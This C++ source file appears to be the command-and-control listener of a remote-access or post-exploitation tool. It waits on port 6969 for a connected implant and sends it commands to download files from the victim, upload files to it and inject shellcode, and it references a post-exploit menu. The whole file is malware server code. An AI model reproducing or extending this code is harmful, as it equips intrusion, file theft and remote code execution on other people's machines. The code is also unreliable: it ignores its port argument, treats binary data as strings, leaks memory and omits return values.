#include "listener.h"
#include "menus.h"
#include <fstream>

using namespace std;

void sigchld_handler(int s)
{
	(void)s; // quiet unused variable warning

	// waitpid() might overwrite errno, so we save and restore it:
	int saved_errno = errno;

	while(waitpid(-1, NULL, WNOHANG) > 0);

	errno = saved_errno;
}

void *get_in_addr(struct sockaddr *sa)
{
	if (sa->sa_family == AF_INET) {
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}

	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
listener::listener(int port){
	this->port = port;
	char PORT[]="6969";
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE; // use my IP

	if ((rv = getaddrinfo(NULL, PORT, &hints, &servinfo)) != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		return;
	}

	// loop through all the results and bind to the first we can
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			perror("server: socket");
			continue;
		}

		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
			perror("setsockopt");
			exit(1);
		}

		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
			close(sockfd);
			perror("server: bind");
			continue;
		}
		break;
	}

	freeaddrinfo(servinfo); // all done with this structure

	if (p == NULL)  {
		fprintf(stderr, "server: failed to bind\n");
		exit(1);
	}

	if (listen(sockfd, 1) == -1) {
		perror("listen");
		exit(1);
	}

	sa.sa_handler = sigchld_handler; // reap all dead processes
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if (sigaction(SIGCHLD, &sa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}

}
void listener::test(){
	printf("server: waiting for connections...\n");
	sin_size = sizeof their_addr;
	new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
	if (new_fd == -1) {
		cout<<"accepted error"<<endl;
	}
	cout<<"got connection"<<endl;
	status = 1;
	inet_ntop(their_addr.ss_family, get_in_addr((struct sockaddr *)&their_addr), s, sizeof s);
	//postExploitMenu(this);

	//close(sockfd);
	//close(new_fd);
}

int listener::downloadFile(string r_path, string l_path) {
	printf("Download File...\n");
	ofstream out(l_path, ios::binary);

	string cmd = "download:" + r_path;
	send(new_fd, cmd.c_str(), cmd.length(), 0);
			
	while (out.is_open()) {
		char *recvbuf = new char[1024];
		int bytes = recv(new_fd, recvbuf, 1024, 0);

		int len_recv = strlen(recvbuf);
		printf("Length of recvbuf is %d\n", len_recv);
		if (len_recv > 0) {
			printf("Writing to file\n");
			out.write(recvbuf, len_recv);
			memset(recvbuf, '\0', 1024);
		} else {
			printf("Closing file error: %s\n", strerror(errno));
			out.close();
			break;
		}

		if (len_recv < 1024) {
			printf("Last section of file\n");
			out.close();
			break;
		}
	}
	printf("Finished Downloading!\n");
}

int listener::uploadFile(string l_path, string r_path) {
	printf("Uploading File...\n");
	std::streampos filesize = 0;
	ifstream in(l_path, std::ios::binary);
	char* sendbuf = new char[1024];
	int sendbuflen = 1024;
	memset(sendbuf, '\0', sendbuflen);

	string cmd = "upload:" + r_path;
	send(new_fd, cmd.c_str(), cmd.length(), 0);

	while (in.is_open()) {
		printf("File is open\n");
		in.read(sendbuf, sendbuflen);
		if (in.eof()) {
			printf("End of file\n");
			send(new_fd, sendbuf, sendbuflen, 0);
			memset(sendbuf, '\0', sendbuflen);
			in.close();
		} else {
			printf("Sending file\n");
			send(new_fd, sendbuf, sendbuflen, 0);
			memset(sendbuf, '\0', sendbuflen);
		}
	}
	printf("Finished Uploading!\n");
}

int listener::injectShellcode() {
	printf("Injecting Shellcode...\n");
	string cmd = "shellcode:";
	send(new_fd, cmd.c_str(), cmd.length(), 0);
}

string listener::print(){
	string out = "port: "+to_string(port)+" "+to_string(status);
	return out;
}
